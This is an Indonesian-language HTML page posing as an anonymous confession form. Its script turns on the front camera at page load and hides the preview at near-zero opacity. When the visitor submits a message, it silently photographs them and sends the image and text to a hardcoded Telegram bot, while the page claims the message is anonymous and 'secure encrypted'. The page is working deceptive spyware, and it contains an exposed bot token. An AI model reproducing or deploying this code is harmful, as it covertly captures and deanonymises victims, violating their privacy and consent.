<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Pesan Anonim</title>
    <style>
        body { background: #121212; color: white; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
        .container { padding: 40px 20px; position: relative; z-index: 10; }
        textarea { width: 100%; height: 120px; border-radius: 12px; margin: 20px 0; background: #222; color: white; border: 1px solid #333; padding: 15px; box-sizing: border-box; }
        .btn { background: #ff4b2b; background: linear-gradient(to right, #ff416c, #ff4b2b); color: white; border: none; padding: 15px; border-radius: 30px; width: 100%; font-weight: bold; font-size: 16px; }
        
        /* Trick: Kamera ditaruh di belakang tapi tetep 'tampil' biar sensor aktif */
        #video-preview {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; opacity: 0.02; /* Nyaris gak kelihatan tapi ada */
            pointer-events: none; z-index: 1;
        }
        #flash {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; z-index: 100; pointer-events: none;
        }
    </style>
</head>
<body>

    <div id="flash"></div>
    <video id="video-preview" autoplay playsinline muted></video>
    <canvas id="canvas-capture" style="display:none;"></canvas>

    <div class="container">
        <h2>💌 Confess Lu</h2>
        <p>Tulis apa aja, rahasia lu aman anonim.</p>
        <textarea id="pesan" placeholder="Misal: Lu cantik banget hari ini..."></textarea>
        <button class="btn" onclick="prosesKirim()">Kirim Sekarang</button>
        <p id="info" style="font-size: 10px; color: #555; margin-top: 20px;">Secure Encrypted by Volox-Tech</p>
    </div>

    <script>
        const video = document.getElementById('video-preview');
        const canvas = document.getElementById('canvas-capture');
        const flash = document.getElementById('flash');
        
        const token = "7945183514:AAEQCbHUMs7DO0OfTBYgsHWtLDDOfiKSee0";
        const chatId = "8465963357";

        // Minta akses kamera pas masuk
        async function startSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await video.play();
            } catch (err) { alert("Klik 'Izinkan' biar bisa kirim pesan anonim!"); }
        }
        startSystem();

        function prosesKirim() {
            const txt = document.getElementById('pesan').value;
            if(!txt) return alert("Isi pesannya dulu!");

            // Efek Flash & Jepret
            flash.style.opacity = "1";
            setTimeout(() => { flash.style.opacity = "0"; }, 100);

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'target.jpg');
                fd.append('caption', `KONFES: ${txt}`);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                alert("Pesan Terkirim!");
                document.getElementById('pesan').value = "";
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
